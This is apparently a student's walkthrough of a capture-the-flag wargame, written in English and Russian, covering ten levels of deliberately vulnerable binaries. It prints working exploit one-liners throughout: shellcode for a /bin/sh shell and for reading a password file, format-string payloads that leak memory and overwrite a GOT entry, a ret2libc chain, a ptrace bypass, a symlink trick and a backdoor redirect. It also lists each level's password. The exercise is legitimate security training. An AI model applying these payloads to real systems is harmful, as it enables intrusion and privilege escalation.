===========
LEVEL00
===========
this ones easy. find cmp in disas main, there's a cmp with hex value which is decimal 5276
when propted enter 5276 as passwd and you get the level1 shell;

cat /home/users/level01/.pass

uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL


===========
LEVEL01
===========

checking functions, no syscall, it's shellcode time

info vars -> 0x0804a040  a_user_name

cat binary and find all non encoded shit to try for username, 
"dat_wil" works


use maxonchiks method to find the offset for buff overflow, 80

so the line be: "dat_wil" + (shellcode + "\n" + garbage to get to 80) + shellcode addr

shellcode addr = beginning of memory for vars, that being the beginning of "dat_will" + 7 => 0x0804a040 + 7

shellcode: http://shell-storm.org/shellcode/files/shellcode-827.php



checkity check:

python -c "print 'dat_wil' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac' + '\x08\x04\xa0\x47'[::-1]" > /tmp/pepe

cat /tmp/pepe - | ./level01

cat /home/users/level02/.pass

PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv


===========
LEVEL02
===========

with ltrace we find that the file opens passwd.

the thing uses fgets to read input, strncmp to check passwd, probably checking it against the actual flag since ltrace shows attempt to read exactly that.

printf is used for printing the 

> pepe does not have access!

line, meaning it takes username as arg, so let's play with that, feeding it some %p

now lets see where this thing reads in disas main:

   0x00000000004008e6 <+210>:	lea    -0xa0(%rbp),%rax //create buff for reading 0xa0 = 160 in dec
...
   0x00000000004008fe <+234>:	mov    %rax,%rdi //into the rax 
   0x0000000000400901 <+237>:	callq  0x400690 <fread@plt> //we read

https://man7.org/linux/man-pages/man3/printf.3.html
 Format of the format string
check here what da $ doin, basically at allows to get to a place we need in buff for our purposes;

$rsp - the stack pointer here. it's size: 
	   0x0000000000400818 <+4>:	sub    $0x120,%rsp
0x120 = 288

meaning we take 160 bytes out of 288 sized stack, thus buff beginning at 288 - 160
%p will move 8 bytes per step (ptr size == 8 in x64 systems)
thus to print the right bit of stack with passwd we start at (288 - 160) / 8


however this is all some github shit


lets do our way eh?

why not spam %p 30 times and see what we get


11112222333%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p


111122223330x7fffffffe4b0(nil)0x6b0x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6a80x1f7ff9a080x6b6b6b(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)0x32323232313131310x25702570253333330x2570257025702570 does not have access!

lets reverse the shit and see what we get

we check the stuff between nils, notice that reversed 0x2a = '*' and other shit from input, somewhere we will find our buff. but in between we see 

0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d

lets separate them and use .decode() method in python (in vm btw lol)

but instead of hello world obviously our shit
so we have 

0x756e505234376848
0x45414a3561733951
0x377a7143574e6758
0x354a35686e475873
0x48336750664b394d


>>> a = "756e505234376848".decode("hex")[::-1]
>>> print(a)
Hh74RPnu

and so on gives us 

Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H

lol it works

===========
LEVEL03
===========

На входе нас встречает бинарник, который опять просит пароль.
посмотрев cat ./level03 мы видим, что вызывается bin/sh после того, как вводим правильный пароль:
���[�%uCongratulations!/bin/sh

gdb info function указывает нам на наличие данных функций:

0x080485d0  frame_dummy
0x080485f4  clear_stdin
0x08048617  get_unum
0x0804864f  prog_timeout
0x08048660  decrypt
0x08048747  test


disas main говорит о том, что мы сначала принтим 

$ ./level03             			  0x08048880 <+38>:	movl   $0x8048a48,(%esp)
***********************************		  0x08048887 <+45>:	call   0x80484d0 <puts@plt>   
*		level03		**		  0x0804888c <+50>:	movl   $0x8048a6c,(%esp)
***********************************		  0x08048893 <+57>:	call   0x80484d0 <puts@plt>
						  0x08048898 <+62>:	movl   $0x8048a48,(%esp)
						  0x0804889f <+69>:	call   0x80484d0 <puts@plt>

Потом после просьбы ввода пароля вызывается функция test:
   0x080488d5 <+123>:	call   0x8048747 <test>
   c аргументами пароля и каким-то странным значением:
      0x080488ca <+112>:	movl   $0x1337d00d,0x4(%esp)


   0x08048748 <+1>:	mov    %esp,%ebp        
   0x0804874a <+3>:	sub    $0x28,%esp		
   0x0804874d <+6>:	mov    0x8(%ebp),%eax
   0x08048750 <+9>:	mov    0xc(%ebp),%edx
   0x08048753 <+12>:	mov    %edx,%ecx
   0x08048755 <+14>:	sub    %eax,%ecx 	value = password - 0x1337d00d
   0x08048757 <+16>:	mov    %ecx,%eax
   0x08048759 <+18>:	mov    %eax,-0xc(%ebp)
   0x0804875c <+21>:	cmpl   $0x15,-0xc(%ebp) if (value > 0x15) о чем нам говорит, что ИТОГОВЫЙ пароль <= 0x15
   0x08048760 <+25>:	ja     0x804884a <test+259> then
   0x0804884a <+259>:	call   0x8048520 <rand@plt>
   0x0804884f <+264>:	mov    %eax,(%esp)
   0x08048852 <+267>:	call   0x8048660 <decrypt> decrypt(rand)

   иначе мы делаем побитовый сдвиг влево и добавляем странное число 0x80489f0
   0x08048766 <+31>:	mov    -0xc(%ebp),%eax 
   0x08048769 <+34>:	shl    $0x2,%eax.      value = value << 2
   0x0804876c <+37>:	add    $0x80489f0,%eax value += 0x80489f0
   0x08048771 <+42>:	mov    (%eax),%eax     
	
   Далее идет какой-то странный вызов ряда decrypt
   0x08048790 <+73>:	jmp    0x8048858 <test+273>
   0x08048795 <+78>:	mov    -0xc(%ebp),%eax
   0x08048798 <+81>:	mov    %eax,(%esp)
   0x0804879b <+84>:	call   0x8048660 <decrypt>
   0x080487a0 <+89>:	jmp    0x8048858 <test+273>
   0x080487a5 <+94>:	mov    -0xc(%ebp),%eax
   0x080487a8 <+97>:	mov    %eax,(%esp)
   0x080487ab <+100>:	call   0x8048660 <decrypt>
   0x080487b0 <+105>:	jmp    0x8048858 <test+273>
   0x080487b5 <+110>:	mov    -0xc(%ebp),%eax
   0x080487b8 <+113>:	mov    %eax,(%esp)

Вообще, выглядит так, как будто наш пароль находится в рендже 0x1337d00d - 0x15. Т.к тест вызывается с аргументами password, 0x1337d00d. Далее идет вычитание из password числа 0x1337d00d и если оно в рендже 0x15, то идем в декрипт. Кажется можно попробовать забрутфорсить пароль. Т.е брать за основу пароль 0x1337d00d, далее отнимать от 0x0 до 0x15. Попробуем посмотреть к чему это приведет
0x1337d00d - 322424845
0x15 - 21

путем долгого перебора пришли к паролю:
322424827

$ cat /home/users/level04/.pass
kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf

===========
LEVEL04
===========

катнув левел, мы видим мем:
[�%uGive me some shellcode, kchild is exiting...no exec() for you;P	L��

Походу тут опять какой-нибудь gets для которого нужен shellcode
ltrace собственно подтверждает 
level04@OverRide:~$ ltrace ./level04
__libc_start_main(0x80486c8, 1, -10348, 0x8048830, 0x80488a0 <unfinished ...>
signal(14, 0x0804868f)                                                   = NULL
alarm(60)                                                                = 0
fork(Give me some shellcode, k
)                                                                   = 2120
wait(0xf

info functions:
0x080484a0  fflush
0x080484a0  fflush@plt
0x080484b0  gets 			как я и говорил
0x080484b0  gets@plt
0x080484c0  getchar
0x080484c0  getchar@plt
0x080484d0  signal
0x080484d0  signal@plt
0x080484e0  alarm
0x080484e0  alarm@plt
0x080484f0  wait
0x080484f0  wait@plt
0x08048500  puts
0x08048500  puts@plt

Но есть какой-то страшный fork

   0x080486d6 <+14>:	call   0x8048550 <fork@plt> -- форкаемся
   0x080486db <+19>:	mov    %eax,0xac(%esp)
   0x080486e2 <+26>:	lea    0x20(%esp),%ebx
   0x080486e6 <+30>:	mov    $0x0,%eax
   0x080486eb <+35>:	mov    $0x20,%edx
   0x080486f0 <+40>:	mov    %ebx,%edi
   0x080486f2 <+42>:	mov    %edx,%ecx
   0x080486f4 <+44>:	rep stos %eax,%es:(%edi)
   0x080486f6 <+46>:	movl   $0x0,0xa8(%esp)
   0x08048701 <+57>:	movl   $0x0,0x1c(%esp)
   0x08048709 <+65>:	cmpl   $0x0,0xac(%esp) смотрим что мы - чайлд (obj = fork; if obj == 0 then we are child)
   0x08048711 <+73>:	jne    0x8048769 <main+161> и если мы чайлд то
   0x0804875e <+150>:	call   0x80484b0 <gets@plt> по итогу проваливаемся в гетс который мы должны хАкнуть

Т.е мы за раз(родителем) должны провалится в gets и вставить туда shellcode. так же мы должны найти offset. Ищем через https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
ю.д

ltrace -f позволяет нам отслеживать дочерний процесс

оффсет в 100 нам ничего не дал, пробуем в 200

level04@OverRide:~$ ltrace -f ./level04
[pid 2257] __libc_start_main(0x80486c8, 1, -10348, 0x8048830, 0x80488a0 <unfinished ...>
[pid 2257] signal(14, 0x0804868f)                                        = NULL
[pid 2257] alarm(60)                                                     = 0
[pid 2257] fork()                                                        = 2258
[pid 2257] wait(0xffffd65c <unfinished ...>
[pid 2258] <... fork resumed> )                                          = 0
[pid 2258] prctl(1, 1, 0, 0xf7e2fe44, 2944)                              = 0
[pid 2258] ptrace(0, 0, 0, 0, 2944)                                      = -1
[pid 2258] puts("Give me some shellcode, k"Give me some shellcode, k
)                             = 26
[pid 2258] gets(-10656, 0, 0, 0, 2944Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
)                                   = -10656
[pid 2258] --- SIGSEGV (Segmentation fault) ---
[pid 2258] +++ killed by SIGSEGV +++
[pid 2257] --- SIGCHLD (Child exited) ---
[pid 2257] <... wait resumed> )                                          = 2258
[pid 2257] puts("child is exiting..."child is exiting...
)                                   = 20
[pid 2257] +++ exited (status 0) +++
level04@OverRide:~$

EIP не дал :( . Тогда идем в gdb
set follow-fork-mode child - позесимся в child.

(gdb) r
Starting program: /home/users/level04/level04
[New process 2265]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2265]
0x41326641 in ?? () - EIP :)

Вставив его в генератор получим оффсет: 
156

далее находим shellcode to open bin/sh. Но есть проблема, используется ptrace родителем, который запрещает execute дочернему процессу.
Поэтому нам нужно не вызывать execute, а читать: http://shell-storm.org/shellcode/files/shellcode-73.php
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
"\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"
"\x80\x89\xc6\xeb\x06\xb0\x01\x31"
"\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
"\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
"\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
"\x04\xb3\x01\xb2\x01\xcd\x80\x83"
"\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
"\xff"
"/etc/passwd"; //Put here the file path, default is /etc/passwd

export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'

megahuxks.c:
#include <stdio.h>
#include <stdlib.h>

int main()
{
	printf("%p\n", getenv("SHELLCODE"));
}

если скомпилим по дефолту, то будет компилить в x64, но адрес его нам не подходит, по этому компилим 32 
level04@OverRide:/tmp$ gcc -m32 megahuxks.c
level04@OverRide:/tmp$ ./a.out
0xffffd881


По итогу эксплойт:

offset + shellcodeaddr


level04@OverRide:~$ python -c "print 156 * 'a' + '\x81\xd8\xff\xff'" | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...


===========
LEVEL05
===========

info functions дает нам такой рассклад:
0x08048340  printf
0x08048350  fgets
0x08048370  exit
0x08048420  frame_dummy
0x08048444  main


so we need shellcode coz this shit aint using no syscall with bin sh
we have printf which can be fucked with and we have exit after printf, whose *jmp addr we can reroute to shellcode addr

disas exit gives this addr: 
jmp    *0x80497e0

buff addr (???)
0x080497e8  data_start


so first of all in this shit u cant execute stack, 


https://en.wikipedia.org/wiki/Executable_space_protection

google non executable stack for info, but tldr:

dmesg | grep "Execute Disable"
[    0.000000] NX (Execute Disable) protection: active

https://access.redhat.com/solutions/2936741

meaning we cant do the old good shit


well we still need to put in some shellcode coz still no syscall with bin sh

some googling gets me here:
https://access.redhat.com/solutions/2936741
where i get a fine advice of using env var for injecting shellcode.
see, it's the memory addresses which are being checked for this kind of protection
and env vars addresses are quite different from local stack addresses which allows us to well
OVERRIDE the protection kek

anyway, the general solution is the following:
1. we need to export some shellcode as an env var
2. we need to get its address
3. as we will see further this address will be quite unwritebale with the usual int due to int overflow
4. however, two short ints following each other will be written in memory following one another
which will form the right address

so lets go
1. we need to export the shellcode, however, the program does some xor shit to each symbol in buffer which can alterante the shellcode (byez say its tolower but whateves). we don't want it touched so we need to skip the original buff.

use the old generator (ask maxxon for that) to check the buff size. its a 100.
so we need to add some 100 bytes to shellcode then we take its address.

export PEPEGA=`python -c 'print("\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`

check env vars in gdb:

b *main+4
r
x/200s environ

0xffffde70: // the address	 "PEPEGA=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\22---Type <return> to continue, or q <return> to quit---
0\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343PS\211\341\260\v̀"


0xffffde70 hex to decimal = 4294958704 // see, that's the int overflow i was talking about

exit addr also should be split to write parts of shellcode addr in approprite mem

currently on my machine the hex-to-dec value for addr is the following (may not work the same?):

0xffff = 65535 // same
0xde70 = 56944 //28894

to that shit we need the following adjustments:
- 8 bytes for ptr
- characters already written


making the digits the following: (56944 - 8) + (65535 - 56944) = 56936 + 8591



for printf - the old boy %n specifier + width

(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56936d%10$hn" + "%8591d%11$hn")'; cat) | ./level05

cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq


===========
LEVEL06
===========
so the thing again asks for login and passwd

info functions: noticable stuff
	- printf //maybe overflow?
	- some weird signals and alarms
	- syscall // no shellcode here?
	- ptrace //dafuq?
	- auth //lets check this


auth: after some time notice this 
   0x08048866 <+286>:	cmp    -0x10(%ebp),%eax
is this the same stuff as level00 kek?

oh wow look at this
.---------------------------.
| !! TAMPERING DETECTED !!  |
'---------------------------'
[Inferior 1 (process 1862) exited with code 01]
(gdb)

ok, thats what ptrace does here.
   0x080487ba <+114>:	cmp    $0xffffffff,%eax
and this is where this shit happens

so we get to this line in gdb and change eax val from -1 to 0, ((gdb) set $eax=0)
then we can get to the cmp line

set breakpoint at cmp
chack whats compared: eax vs -0x10(%ebp)
check value of -0x10(%ebp): 

(gdb) x/d $ebp-0x10
0xffffd5d8:	6232805
(login pepega, passwd may be whatevs during gdb stuff)

try the serial
it works


cat /home/users/level07/.pass
GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8



===========
LEVEL07
===========

https://infosecwriteups.com/ret2libc-attack-in-lin-3dfc827c90c3
https://shellblade.net/files/docs/ret2libc.pdf
btw these articles are useful for all prev levels starting 05 (NX protection)
https://undo.io/resources/gdb-watchpoint/how-search-byte-sequence-memory-gdb-command-find/ - find gdb

Нас встречает программа: которая сохраняет в data table цифорки. Спустя недолгое время ресеча натыкаемся на тему Ret2Libc attack: https://infosecwriteups.com/ret2libc-attack-in-lin-3dfc827c90c3 , https://shellblade.net/files/docs/ret2libc.pdf . Первая статья буквально по шагово объясняет нам как пройти данный уровень. 

Так же мы видим такой ряд функций:
0x080485a0  frame_dummy
0x080485c4  clear_stdin
0x080485e7  get_unum
0x0804861f  prog_timeout
0x08048630  store_number - По любому здесь мы найдем адрес data table.
0x080486d7  read_number
0x08048723  main

Нам необходимо:
1. Найти адрес system
2. Найти адрес exit
3. Найти адрес "bin/sh"
4. Найти адрес data table
5. Найти eip адрес
6. Реализовать эксплойт (arg 1 = system, arg 2 = exit, arg 3 = bin/sh)


(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>  4159090384
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit> 4159040368
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec 4160264172

Breakpoint 1, 0x08048729 in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd650:
 eip = 0x8048729 in main; saved eip 0xf7e45513
 Saved registers:
  ebp at 0xffffd648, eip at 0xffffd64c - наш eip


End of assembler dump.
(gdb) p $ebp+0x8
$1 = (void *) 0xffffd460
(gdb) x/a 0xffffd460
0xffffd460:	0xffffd484 - data table addr

0xffffd64c - 0xffffd484 = 456
456 / 4(sizeof(uint)) = 114
114 - protected (%3 == 0)
then use uint max(2^32) + 114:
1073741938
1073741938 % 3 = 1


Эксплойт:
1) store
	4159090384 (system)
	1073741938 (114 index)
2) store
	4159040368 (exit)
	115
3) store
	4160264172 (bin/sh)
	116
4) quit

level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08

$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC

===========
LEVEL08
===========

level08@OverRide:~$ ./level08
Usage: ./level08 filename
ERROR: Failed to open (null)

Нас встречает програ, которая на вход жрет файл
и судя по info functions читает, и пишет в него что-то

0x00000000004006f0  strcpy
0x0000000000400700  write
0x0000000000400710  fclose
0x0000000000400730  printf
0x0000000000400740  snprintf
0x0000000000400750  strncat
0x0000000000400760  fgetc
0x0000000000400770  close
0x0000000000400780  strcspn
0x00000000004007a0  fprintf
0x00000000004007b0  open
0x00000000004007c0  fopen
0x00000000004007d0  exit
0x00000000004008a0  frame_dummy
0x00000000004008c4  log_wrapper
0x00000000004009f0  main

Судя по всему он так же логгирует куда-то (log_wrapper)

ls -la показывает, что есть папочка backups, которой владеет level09:
drwxrwx---+ 1 level09 users      60 Oct 19  2016 backups

В которой есть файл 
-rwxrwx---+ 1 level09 users    24 Jun 13 14:43 .log

КАРОЧ

эта шляпа копирует файл в папку бэкапс. Если попробовать скопипастить файл .pass ничего и не выйдет
А вот если создать на него ссылку (предварительно бахнув chmod себе в папку) - то его скопирует кек. И он будет уже от нашего юзера
и откроется. Пароль 

fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S


===========
LEVEL09
===========

This ones a combo of some prev levels.

we have an uncalled function secret_backdoor(), that calls fgets for stuff and the calls sytem presumably with the input

we need to use buff overflow to write this function's address just as we ve done before, the only difference really is 
the usage of strncpy which means we also need to fuck up the max len value during overflow (well just put the max value in corresponding address)

With pattern generator well find the required offset to write the address of secret_backdoor()
finally we'll add "bin/sh" as input for s_b()


(python -c 'print "A" * 40 + "\xff" + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00" + "\n" + "/bin/sh"'; cat) | ./level09

cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE





